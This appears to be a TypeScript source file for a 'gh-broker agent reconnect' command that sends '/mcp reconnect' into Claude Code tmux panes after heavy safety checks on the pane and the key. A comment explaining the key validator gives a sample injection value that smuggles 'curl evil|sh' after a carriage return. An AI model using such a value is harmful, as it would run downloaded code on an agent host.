/**
 *
 *	@Project: @cldmv/gh-broker
 *	@Filename: /src/cli/reconnect.ts
 *	@Date: 2026-11-21T00:00:00-08:00 (1795248000)
 *	@Author: Nate Corcoran <CLDMV>
 *	@Email: <Shinrai@users.noreply.github.com>
 *	-----
 *	@Last modified by: Nate Corcoran <CLDMV> (Shinrai@users.noreply.github.com)
 *	@Last modified time: 2026-11-21T12:23:30-08:00 (1795292610)
 *	-----
 *	@Copyright: Copyright (c) 2013-2026 Catalyzed Motivation Inc. All rights reserved.
 *
 */

/**
 * `gh-broker agent reconnect` (#223): send `/mcp reconnect <key>` to each running Claude Code
 * session of a registered agent (or one agent). The key is the agent's actual `mcpServers` entry
 * for the broker, read back from its `.claude.json` files — mcp-config.ts writes those entries, so
 * brokerKeyOf knows what one looks like wherever it is. The sessions are found as root through
 * every tmux server the agent user runs (src/cli/tmux.ts), but every tmux command runs AS THE
 * AGENT, so root never types into a server the agent itself couldn't reach. Nothing is typed into
 * a pane unless its composer is visibly empty, Claude is working in the foreground of it, the key
 * is one that can't carry a newline or shell metacharacter, and the screen is re-captured just
 * before sending; skipped panes are listed with their id and a reason so they can be retried.
 * Every effect is injected.
 */
import { agentsDir, assertAgentName, registeredAgents, type Group, type UserInfo } from "./agents.ts";
import { brokerKeyOf, extraFolders, inFolder, MCP_FILE, type FolderIo, type Place } from "./mcp-config.ts";
import type { Pane, TmuxServer } from "./tmux.ts";
import type { ConfigLayer } from "./config-merge.ts";

export const RECONNECT_HELP = `agent reconnect [<user>] [--dry-run]

Sends "/mcp reconnect <key>" to every running Claude Code session of a
registered agent (or all of them): the sessions the broker restart drops.
<key> is the agent's actual mcpServers entry for the broker, read back from
its .claude.json files. A pane is skipped, with its id and the reason, when
someone is typing in it, Claude is working in it, it is in copy mode, or its
key is not one that is safe to type blind. --dry-run lists what it would
send where.`;

/** The effects `agent reconnect` (and `upgrade`'s last step) use. */
export interface ReconnectDeps {
	log: (m: string) => void;
	error: (m: string) => void;
	groups: () => Group[];
	userInfo: (user: string) => UserInfo | undefined;
	mcpIO: FolderIo;
	/** The agent's tmux servers: socket + the binary that owns it (a client of one version can't reach a server of another). */
	tmuxSockets: (info: UserInfo) => TmuxServer[];
	/** The Claude Code panes on one tmux server, with their screen and foreground/mode state. */
	tmuxPanes: (server: TmuxServer, info: UserInfo) => Pane[];
	/** Re-capture one pane's screen right before sending; undefined when the pane is gone. */
	tmuxPaneText: (server: TmuxServer, pane: string, info: UserInfo) => string | undefined;
	/** Send literal text to a pane as the agent and press Enter (tmux send-keys -l, then a separate Enter). */
	tmuxSend: (server: TmuxServer, pane: string, text: string, info: UserInfo) => void;
}

/**
 * Heuristics over Claude Code's screen, from the captured pane text (real captures of the current
 * TUI are the test fixtures). The TUI changes between versions, so they err toward skipping a
 * pane: one is only sent to when its input line is visibly empty and nothing suggests Claude is
 * working. A skipped pane is listed with its id, so it can be retried.
 */

/** Spinner glyphs Claude Code's working indicator uses (✻✽✳✶✷✸✹✢✦· — the installed build also rotates through * when TERM isn't xterm-ghostty, i.e. always inside tmux), starting a line of text. */
const SPINNER = /^\s*[✻✽✳✶✷✸✹✢✦·*]\s*\S/;
/** A finished turn's banner ("✻ Baked for 29s · done 9:55 AM") — a spinner glyph, but not working. */
const DONE_BANNER = /· done\b/;

/**
 * Whether Claude Code is busy in the pane: a spinner-glyph line that isn't a finished-turn banner
 * (the current TUI's working line, "✻ Waiting for 1 background agent to finish", carries no
 * ellipsis and no "esc to interrupt"), or the "esc to interrupt" hint older versions show. With
 * -J the capture joins a wrapped indicator line; a glyph line's first fragment still matches even
 * unjoined, so a narrow pane reads as busy either way.
 */
export function busyPane(text: string): boolean {
	const lines = text.split("\n").map((l) => l.replace(/\s+$/, ""));
	const topRule = (i: number): boolean => RULE.test(lines[i]!) && /^[❯>]/.test(lines[i + 1] ?? "");
	return lines.some((l, i) => {
		if (/esc to interrupt/i.test(l)) return true;
		if (SPINNER.test(l) && !DONE_BANNER.test(l)) return true;
		// Sturdier: whatever non-blank line sits directly above the composer's top rule is the
		// working indicator unless it is the finished-turn banner — a future indicator shape
		// stays caught. (A transcript line that touches the rule reads busy too: skipped, safe.)
		if (topRule(i + 1) && l.trim() !== "" && !DONE_BANNER.test(l) && !RULE.test(l)) return true;
		return false;
	});
}

/** The composer box's rule line ("────"). */
const RULE = /^\s*─+\s*$/;
/** Footer lines under the box — only the known shapes ("⏵⏵ accept edits on …", "? for shortcuts", the "◯" task bullet, "new task?"), so a draft's own continuation starting with "?" or "●" doesn't end the scan. */
const FOOTER = /^\s*(?:⏵|◯)|\b(?:for shortcuts|to cycle|to manage|new task\?)/;

/**
 * The state of Claude Code's input line in the pane: "empty" (a "❯"/"> " line with nothing typed),
 * "typing" (text in it, or any non-blank line between it and the box's closing rule — a draft can
 * start with a blank first line), or "none" (no input line on screen — a dialog, or bash/memory
 * input mode). The live box is the bottom-most prompt line: user messages in the transcript carry
 * a "❯" too, but the box sits under them. A shell's PS2 continuation ("> ") can only show while
 * the shell owns the tty, in which case no claude is the pane's foreground job — the foreground
 * check catches that pane even when this reads "empty".
 */
export function composerState(text: string): "empty" | "typing" | "none" {
	const lines = text.split("\n").map((l) => l.replace(/\s+$/, ""));
	for (let i = lines.length - 1; i >= 0; i--) {
		const m = /^[❯>](?: (.*))?$/.exec(lines[i]!);
		if (!m) continue;
		for (let j = i + 1; j < lines.length; j++) {
			const below = lines[j]!;
			if (RULE.test(below) || FOOTER.test(below)) break;
			if (below.trim() !== "") return "typing";
		}
		return m[1]?.trim() ? "typing" : "empty";
	}
	return "none";
}

/**
 * A key that is safe to type blind into a pane: alphanumerics, "_", "." and "-", at most 64
 * characters. The agent controls its `mcpServers` key names, and send-keys -l delivers CR/LF as
 * Enter — a key like "github\r!curl evil|sh" would submit the reconnect and then run a command.
 */
export const safeKey = (key: string): boolean => /^[A-Za-z0-9_.-]{1,64}$/.test(key);

/** Control characters never reach root's terminal in a log line: a socket path, pane id or a tmux error message carrying C0 or C1 controls (U+009B is CSI on some terminals) is blanked out. */
const clean = (s: string): string => s.replace(/[\x00-\x1f\x7f\x80-\x9f]/g, "?");

/** Split `agent reconnect` arguments into the agent users (at most one), --dry-run and --help. */
function parseReconnectArgs(rest: string[]): { users: string[]; dryRun: boolean; help: boolean } {
	const users: string[] = [];
	let dryRun = false;
	let help = false;
	for (const a of rest) {
		if (a === "--dry-run") dryRun = true;
		else if (a === "-h" || a === "--help") help = true;
		else if (a.startsWith("-")) throw new Error(`unknown flag: ${a}`);
		else users.push(a);
	}
	if (users.length > 1) throw new Error("name at most one agent user: sudo gh-broker agent reconnect [<user>]");
	return { users, dryRun, help };
}

/**
 * The broker key in each of the agent's `.claude.json` files that has one, by folder. A folder
 * root won't read (SkippedFolder) or an unreadable file contributes no key.
 */
function keysOf(places: Place[], info: UserInfo, dir: string, d: { mcpIO: FolderIo }): Map<string, string> {
	const keys = new Map<string, string>();
	for (const place of places) {
		try {
			const key = inFolder(place, info, d, (io) => brokerKeyOf(io.read(`${place.folder}/${MCP_FILE}`, info.uid)?.text, dir));
			if (key) keys.set(place.folder, key);
		} catch {
			// the folder can't be used: it contributes no key
		}
	}
	return keys;
}

/**
 * The key to send to a pane: the one in the session's own config folder's file, else the home
 * file's. A pane whose own session folder has no broker entry is skipped, not guessed at — some
 * other folder's key may be wrong for that session.
 */
function keyFor(pane: Pane, info: UserInfo, keys: Map<string, string>): string | undefined {
	return (pane.configDir && keys.get(pane.configDir)) || keys.get(info.home);
}

/**
 * Run one `agent reconnect`. Returns the exit code: 0 when every pane found was sent to (or
 * there were none), 1 when any pane was skipped or a user is missing.
 */
export function reconnect(rest: string[], config: ConfigLayer, d: ReconnectDeps): number {
	const { users, dryRun, help } = parseReconnectArgs(rest);
	if (help) {
		d.log(RECONNECT_HELP);
		return 0;
	}
	const dir = agentsDir(config.listen);
	const registered = registeredAgents(d.groups()).map((a) => a.user);
	for (const user of users) {
		assertAgentName(user);
		if (!registered.includes(user)) throw new Error(`"${user}" is not a registered agent`);
	}
	let sent = 0;
	let skipped = 0;
	const skip = (user: string, socket: string, pane: string, key: string | undefined, why: string): void => {
		d.log(`${user} ${clean(socket)} ${clean(pane)} ${key ?? "-"} skipped (${why})`);
		skipped++;
	};
	for (const user of users.length ? users : registered) {
		const info = d.userInfo(user);
		if (!info) {
			d.error(`${user}: no such user`);
			skipped++;
			continue;
		}
		const places: Place[] = [{ folder: info.home, saved: false }, ...extraFolders(info, d, config, user)];
		const keys = keysOf(places, info, dir, d);
		let panes = 0;
		const servers = d.tmuxSockets(info);
		for (const server of servers) {
			const socket = server.socket;
			for (const pane of d.tmuxPanes(server, info)) {
				panes++;
				if (pane.inMode) {
					skip(user, socket, pane.id, undefined, "pane is in copy mode");
					continue;
				}
				if (pane.synchronized) {
					skip(user, socket, pane.id, undefined, "synchronize-panes is on");
					continue;
				}
				// tmux pane ids are %<number>; anything else from the (agent-controlled) server is
				// not typed at, and only its cleaned form reaches the log.
				if (!/^%\d+$/.test(pane.id)) {
					skip(user, socket, pane.id, undefined, "unsafe pane id");
					continue;
				}
				const key = keyFor(pane, info, keys);
				if (!key) {
					skip(user, socket, pane.id, undefined, "no broker MCP entry in its .claude.json files");
					continue;
				}
				if (!safeKey(key)) {
					skip(user, socket, pane.id, undefined, "unsafe MCP key");
					continue;
				}
				if (!pane.foreground) {
					skip(user, socket, pane.id, key, "claude is not the pane's foreground job");
					continue;
				}
				if (busyPane(pane.text)) {
					skip(user, socket, pane.id, key, "busy: Claude is working");
					continue;
				}
				const composer = composerState(pane.text);
				if (composer !== "empty") {
					skip(user, socket, pane.id, key, composer === "typing" ? "composer not empty" : "no Claude Code prompt on screen");
					continue;
				}
				if (dryRun) {
					d.log(`${user} ${clean(socket)} ${clean(pane.id)} ${key} would send`);
				} else {
					// Re-capture between the check and the send: the operator may have started
					// typing (or the pane died) while the checks ran.
					const fresh = d.tmuxPaneText(server, pane.id, info);
					if (fresh === undefined) {
						skip(user, socket, pane.id, key, "gone since capture");
						continue;
					}
					if (busyPane(fresh)) {
						skip(user, socket, pane.id, key, "busy since capture");
						continue;
					}
					if (composerState(fresh) !== "empty") {
						skip(user, socket, pane.id, key, "changed since capture");
						continue;
					}
					try {
						d.tmuxSend(server, pane.id, `/mcp reconnect ${key}`, info);
					} catch (err) {
						skip(user, socket, pane.id, key, `send failed: ${clean((err as Error).message)}`);
						continue;
					}
					d.log(`${user} ${clean(socket)} ${clean(pane.id)} ${key} sent`);
				}
				sent++;
			}
		}
		if (panes === 0) d.log(`${user}: no Claude Code sessions running${servers.length ? "" : " (no tmux server)"}`);
	}
	d.log(dryRun ? `dry run: ${sent} pane(s) would get "/mcp reconnect"` : `sent ${sent}, skipped ${skipped}`);
	return skipped === 0 ? 0 : 1;
}
